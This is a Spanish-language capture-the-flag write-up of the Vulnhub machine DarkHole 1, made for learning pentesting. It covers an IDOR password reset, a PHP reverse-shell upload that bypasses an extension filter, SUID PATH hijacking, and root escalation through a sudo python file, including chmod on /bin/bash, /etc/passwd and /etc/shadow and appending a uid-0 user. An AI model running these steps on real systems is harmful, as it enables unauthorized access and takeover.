---
title: "Writeup DarkHole 1"
header:
  image: /assets/images/posts/darkhole1/featured_image_darkhole.jpg
  teaser: /assets/images/posts/darkhole1/featured_image_darkhole.jpg
excerpt_separator: "<!--more-->"
show_date: true
last_modified_at: 2025-12-09T16:20:02-05:00
toc: true
toc_sticky: true
share: true
related: true
categories:
  - writeups
  - Vulnhub
tags:
  - Burp Suite
  - Reverse Shell
  - LFI
  - SUID
collection: writeups
---

En este writeup, resolveré la máquina **DarkHole 1** de **Vulnhub**, documentando cada paso y técnica empleada durante el proceso. A lo largo de este análisis, cubriré desde la recolección de información inicial hasta la explotación de vulnerabilidades y la escalada de privilegios, detallando las herramientas utilizadas y los métodos aplicados.

El objetivo es proporcionar una guía detallada para aquellos interesados en aprender sobre técnicas de pentesting y hacking ético, a través de un enfoque práctico y exhaustivo. Cada etapa del proceso será explicada en detalle para facilitar la comprensión de los desafíos encontrados y las soluciones implementadas. Este writeup está diseñado tanto para novatos como para usuarios avanzados que deseen mejorar sus habilidades en la resolución de máquinas de CTF.

```
 ____             _    _   _       _        _ 
|  _ \  __ _ _ __| | _| | | | ___ | | ___  / |
| | | |/ _` | '__| |/ / |_| |/ _ \| |/ _ \ | |
| |_| | (_| | |  |   <|  _  | (_) | |  __/ | |
|____/ \__,_|_|  |_|\_\_| |_|\___/|_|\___| |_|
                                            
```

| **Name:**         | DarkHole: 1                                   |
| ----------------- | --------------------------------------------- |
| **Date release**: | 18 Jul 2021                                   |
| **Author:**       | Jehad Alqurashi                               |
| **Series:**       | DarkHole                                      |
| **Style**:        | Enumeration/Follow the breadcrumbs            |
| **Goal**:         | get root (uid 0) and read the flag file       |
| **Difficulty**:   | Easy                                          |
| **Web page:**     | https://www.vulnhub.com/entry/darkhole-1,724/ |

## Descripción

It's a box for beginners, but not easy, Good Luck

Hint: Don't waste your time For Brute-Force

## Resolucion de la maquina

## Fase de Fingerprinting / Reconocimiento (Reconnaissance)

### Descubrimiento de IP objetivo en la red

Se realiza el descubrimiento de hosts activos en la red mediante netdiscover para identificar la IP de la máquina objetivo:

```sh
netdiscover -i eth0 -r 192.168.88.0/24
```

Resultado:

![alt text](/assets/images/posts/darkhole1/image.png)

La máquina objetivo se encuentra en la IP 192.168.88.4.

Se comprueba la conectividad con la máquina usando ping:

```sh
ping -c 1 192.168.88.4
```

Resultado:

```sh
PING 192.168.88.4 (192.168.88.4) 56(84) bytes of data.
64 bytes from 192.168.88.4: icmp_seq=1 ttl=64 time=0.487 ms
```

![alt text](/assets/images/posts/darkhole1/image-1.png)

### Descubrimiento de puertos y servicios en el host objetivo

Se realiza un escaneo de puertos y servicios usando nmap. Para ello se guarda la IP objetivo en una variable llamada IP, a continuacion se escanean todos los puertos del objetivo para despues extraerlos a una lista.

Comandos:

```sh
export IP=192.168.88.4
nmap -p- $IP
nmap -p- $IP | awk '{print $1}' | grep -E '^[0-9]+' | cut -d'/' -f1 | paste -sd, - > puertos.txt
cat puertos
```

![alt text](/assets/images/posts/darkhole1/image-3.png)

Con la lista de los puertos obtenidos se realiza un escaneo de los servicios que estan corriendo en esos puertos, el sistema operativo de la maquina objetivo y los scripts comunes para obtener informacion del objetivo mediante el comando:

```sh
nmap -sS -sV -sC -O $IP -oA scan
```

![alt text](/assets/images/posts/darkhole1/image-4.png)

Descubrimos que la máquina tiene un servidor HTTP en el puerto 80 y un servidor SSH en el puerto 22 y que corre un sistema operativo: Linux 4.X o 5.X

| PORT   | STATE | SERVICE | VERSION                                                      |
| ------ | ----- | ------- | ------------------------------------------------------------ |
| 22/tcp | open  | ssh     | OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) |
| 80/tcp | open  | http    | Apache httpd 2.4.41 ((Ubuntu))                               |

## Fase de Footprinting / Exploración (Scanning)

### Exploracion puerto 80

Navegamos al puerto 80 para analizar el sitio web, buscando vulnerabilidades como fallos de configuración o funcionalidades ocultas.

![alt text](/assets/images/posts/darkhole1/image-6.png)

Se descubre una pagina de login.

![alt text](/assets/images/posts/darkhole1/image-7.png)

Se puede pensar en hacer fuerza bruta, pero el laboratorio nos da como consejo inicial que no se pierda tiempo en ello.

Tambien se descubre una pagina de registro.

![alt text](/assets/images/posts/darkhole1/image-8.png)

Los campos de este formulario de registro son un poco confusos por lo que se investiga el codigo del formulario

![alt text](/assets/images/posts/darkhole1/image-10.png)

Se obtiene que el campo 1 es el nombre de usuario, el campo 2 es el email y el campo 3 es la clave para el usuario. Todos estos campos son obligatorios.

### Explotacion

#### Registro de nuevo usuario en el sistema

Se realiza el registro un usuario de prueba con los siguientes datos:

| username | email         | clave |
| -------- | ------------- | ----- |
| test     | test@test.com | test  |

Se comprueba el acceso con el usuario test recien creado y se obtiene acceso.

![alt text](/assets/images/posts/darkhole1/image-11.png)

#### Abuso de navegacion en el sistema

Se aprecia que en la barra de navegacion aparece el ID del usuario

![alt text](/assets/images/posts/darkhole1/image-12.png)

Se intenta comprobar si se tiene acceso a otros usuarios cambiando el ID en la barra de direcciones.

![alt text](/assets/images/posts/darkhole1/image-13.png)

No tenemos acceso a la informacion de otro usuario al cambiar el valor de ID en la barra de direcciones.

Esta prueba no tuvo un final exitoso.

#### Abuso de cambio de contraseña

En esta pagina existen dos formularios con los que podriamos gestionar el usuario con el que estamos logados.

El primer formulario tiene como codigo:

```html
<form name="event" method="post">
    <input type="text" name="username" value="test">
    <input type="email" name="email" value="test@test.com">
    <input type="submit" id="fsubmit" value="Update" class="button">
</form>
```

Y el segundo:

```html
<form name="event" method="post">
    <input type="password" name="password" id="ftitle" placeholder="New Password">
    <input type="hidden" name="id" value="2">
    <input type="submit" id="fsubmit" value="Change" class="button">
</form>
```

Como se puede apreciar existe un campo de tipo hidden (oculto) que contiene el valor del id. Este valor se enviara cuando se lance el boton submit.

Se va a probar el envio del formulario cambiando el valor del id antes de su envio.

Para ello uso burpsuite y se accede al panel de usuario "test" para probar el cambio de clave.

Se rellena el formulario con una clave nueva "nuevaclave" y antes de pulsar el boton "change" se activa el interceptador en burpsuite para capturar el request de la pagina.

![alt text](/assets/images/posts/darkhole1/image-14.png)

Lo pasamos al modulo de repeater de burpsuite para modificar la peticion y enviarla con el valor de id=1.

![alt text](/assets/images/posts/darkhole1/image-15.png)

Se pulsa el boton "send" y en el panel "Response" se obtiene el mensaje "Password has been updated". Por lo que se comprueba que ha funcionado el cambio de clave para el usuario con id=1

![alt text](/assets/images/posts/darkhole1/image-16.png)

Se prueba a acceder con el usuario "admin" y la clave nueva que se ha establecido "nuevaclave"

![alt text](/assets/images/posts/darkhole1/image-17.png)

Y se consigue el acceso al panel del usuario admin

![alt text](/assets/images/posts/darkhole1/image-18.png)

Este panel es diferente ya que añade un modulo en el cual se permite la carga de ficheros.

#### Abuso del modulo de subida de ficheros al servidor

Voy a realizar la subida de una shell reversa en el servidor web a traves del modulo de subida de ficheros para de esta forma obtener una shell en la maquina objetivo.

El primer paso sera obtener la ip de la maquina atacante

```sh
ifconfig eth0
```

![alt text](/assets/images/posts/darkhole1/image-19.png)

A continuación necesito generar un fichero que contenga una shell reversa.

Como se ha visto las paginas que carga el servidor son paginas php, por lo que idealmente podriamos cargar una shell en un fichero php.

Para ello puedo usar la herramienta Reverse Shell Generator que se puede encontrar en [revshells.com](https://www.revshells.com/) configurando los parametros y eligiendo el tipo de listener a usar.

![alt text](/assets/images/posts/darkhole1/image-20.png)

Obtengo un codigo malicioso para crear un fichero php con una shell reversa a la maquina atancante.

Creo un fichero llamado antivirus.php donde insertare el codigo que he obtenido de la web revshells.com

![alt text](/assets/images/posts/darkhole1/image-21.png)

![alt text](/assets/images/posts/darkhole1/image-22.png)

Los parametros que he definido en el archivo malicioso son la IP 192.168.88.3 y el puerto 7331, con ello levanto netcat como listener en dicho puerto

![alt text](/assets/images/posts/darkhole1/image-23.png)

Subo el fichero antivirus.php.

![alt text](/assets/images/posts/darkhole1/image-24.png)

Al subirlo el servidor nos responde que no se pudo subir ya que solo permite ficheros jg, png y gif

Renombro el fichero con la extension phtml

![alt text](/assets/images/posts/darkhole1/image-27.png)

Y realizo de nuevo la subida del fichero.

![alt text](/assets/images/posts/darkhole1/image-26.png)

Veo que me da el mensaje Upload File Successful y me da enlace al fichero subido.

Accedo al enlace para ejecutar el codigo malicioso en el servidor y con ello obtener la shell al sistema.

![alt text](/assets/images/posts/darkhole1/image-29.png)

Se ha conseguido acceso al sistema con el usuario www-data

## Post Explotacion

### Enumeracion local

#### Enumeracion del sistema

Comandos:

```sh
hostname
cat /etc/issue
cat /etc/*release
uname -a
lscpu
df -h
```

![alt text](/assets/images/posts/darkhole1/image-31.png)

#### Enumeracion de usuarios del sistema

Comandos:

```sh
whoami
groups root
cat /etc/passwd | grep sh
groups
who
lastlog | grep "Never"
```

![alt text](/assets/images/posts/darkhole1/image-32.png)

Con estos comandos he conseguido saber lo siguiente:

- El unico usuario con permisos root es el usuario root
- El usuario www-data solo es miembro de www-data
- Existen tres usuario en la maquina objetivo con posiblidad de acceder a una terminal: `root`, `darkhole` y `john`
- La ultima vez que han hecho login en la maquina los usuarios.

#### Enumeración de Red

Compruebo la enumeracion de la red sin obtener grandes hallazgos que no conociese ya.

![alt text](/assets/images/posts/darkhole1/image-33.png)

#### Enumeracion de SUID

Ejecuto el comando:

```sh
find / -perm -4000 2>/dev/null
```

y obtengo:

![alt text](/assets/images/posts/darkhole1/image-34.png)

En este listado hay un directorio que me llama la atencion del usuario john

![alt text](/assets/images/posts/darkhole1/image-35.png)

Compruebo el contenido de la carpeta home del usuario john

Comando:

```sh
cd /home/john
ls -lisah
```

![alt text](/assets/images/posts/darkhole1/image-36.png)

En esta carpeta llama la atencion la carpeta .ssh que tiene permisos para el grupo www-data y el fichero `toto` ya encontrado anteriormente que tiene activo el bit SUID.

### Escalada de privilegios

Voy a realizar la escalada de privilegios apoyandome en los hallazgos obtenidos en la enumeracion local.

#### Escalada de privilegio sobre ejecutable de sistema

Al ejecutar .toto se comprueba que ejecuta el comando `id` del sistema.

Podemos crear nuestra propia version del comando `id` para abusar de permisos de ejecucion y obtener una shell con permisos del usuario.

Para hacer esto tengo que estar en una carpeta con permisos de escritura, habitualmente linux tiene definida la carpeta /tmp como carpeta con permisos de escritura para todos los usuarios.

```sh
cd /tmp
```

A continuacion creo el fichero id al cual le añadire una linea con la llamada a /bin/bash

```sh
echo '/bin/bash' > id
```

Le cambiamos los permisos con el comando

```sh
chmod 777 id
```

En el PATH del sistema añadimos como primera carpeta la carpeta /tmp

```sh
export PATH=/tmp:$PATH
```

![alt text](/assets/images/posts/darkhole1/image-37.png)

A continuacion ejecuto el fichero `toto` y obtengo una shell desde el usuario john.

![alt text](/assets/images/posts/darkhole1/image-39.png)

Compruebo la carpeta del usuario

![alt text](/assets/images/posts/darkhole1/image-40.png)

El usuario john es propietario de varios archivos

- file.py
- user.txt
- password

Si compruebo el contenido de estos ficheros obtengo la flag para el usuario john, y una clave.

![alt text](/assets/images/posts/darkhole1/image-41.png)

```sh
flag DarkHole{You_Can_DO_It}
```

Compruebo el acceso al sistema con john:root123 atraves de ssh.

![alt text](/assets/images/posts/darkhole1/image-42.png)

Compruebo desde el usuario john sobre que binarios tiene permisos de ejecucion de root con el comando:

```sh
sudo -l
```

![alt text](/assets/images/posts/darkhole1/image-43.png)

Obtengo que tiene permisos de ejecucion sobre el binario file.py

Compruebo el fichero file.py

![alt text](/assets/images/posts/darkhole1/image-44.png)

El fichero file.py esta vacio. Voy a abusar de los permisos de ejecucion en este fichero añadiendole codigo.

Dependiendo del codigo que añada puedo conseguir el acceso root de diferentes formas:

#### Escalada de privilegios a root – Tecnica # 01 – setting SUID bit on /bin/bash

Puedo establacer el bit SUID a /bin/bash si añado el siguiente contenido al fichero file.py

Comandos:

```sh
#file.py 
import os;
os.system('chmod +s /bin/bash')
```

![alt text](/assets/images/posts/darkhole1/image-45.png)

Ahora ejecuto file.py como usuario root

```sh
sudo -u root /usr/bin/python3 /home/john/file.py
```

El sistema nos solicita la clave para john y ejecuta el contenido de file.py estableciendo el bit SUID para /bin/bash

![alt text](/assets/images/posts/darkhole1/image-46.png)

Ahora ejecuto una instancia de bash

```sh
bash -p
```

![alt text](/assets/images/posts/darkhole1/image-47.png)

Y consigo obtener el acceso con permisos de root.

![alt text](/assets/images/posts/darkhole1/image-48.png)

#### Escalada de privilegios a root – Tecnica # 02 – PASSWD file

Puedo añadir un usuario al fichero /etc/passwd para poder acceder con permisos root al sistema

Comandos:

```sh
#file.py 
import os;
os.system('chmod 777 /etc/passwd')
```

![alt text](/assets/images/posts/darkhole1/image-49.png)

Ahora ejecuto file.py como usuario root

```sh
sudo -u root /usr/bin/python3 /home/john/file.py
```

Compruebo que el fichero `/etc/passwd` ahora tiene permisos completos.

![alt text](/assets/images/posts/darkhole1/image-50.png)

A continuacion añado al usuario `ibl4zqu3z` con clave `123` en el fichero `/etc/passwd` con permisos de root sobre /bin/bash

```sh
echo 'ibl4zqu3z:$1$UcH1bqbq$q2aTjHzGSqyXJxsE92LRw1:0:0:root:/root:/bin/bash' >> /etc/passwd
```

![alt text](/assets/images/posts/darkhole1/image-51.png)

Esto me permite que al cambiar al usuario `ibl4zqu3z` en la maquina haga un login con permisos de root desde el usuario john.

![alt text](/assets/images/posts/darkhole1/image-53.png)

#### Escalada de privilegios a root – Tecnica # 03 – SHADOW file

Puedo establecer una clave en el fichero /etc/shadow para cualquier usuario de la maquina

Comandos:

```sh
#file.py 
import os;
os.system('chmod 777 /etc/shadow')
```

![alt text](/assets/images/posts/darkhole1/image-54.png)

Ahora ejecuto file.py como usuario root

```sh
sudo -u root /usr/bin/python3 /home/john/file.py
```

Compruebo que el fichero `/etc/shadow` ahora tiene permisos completos.

![alt text](/assets/images/posts/darkhole1/image-55.png)

A continuacion genero un hash de contraseña de tipo SHA-512 para cambiarle la contraseña al usuario root por la clave `123`

Comando:

```sh
openssl passwd -6
```

![alt text](/assets/images/posts/darkhole1/image-56.png)

Accedo al fichero /etc/shadow y realizo el cambio de contraseña

![alt text](/assets/images/posts/darkhole1/image-57.png)

![alt text](/assets/images/posts/darkhole1/image-58.png)

Con esto ya podemos hacer login con el usuario y obtener el acceso root

![alt text](/assets/images/posts/darkhole1/image-59.png)
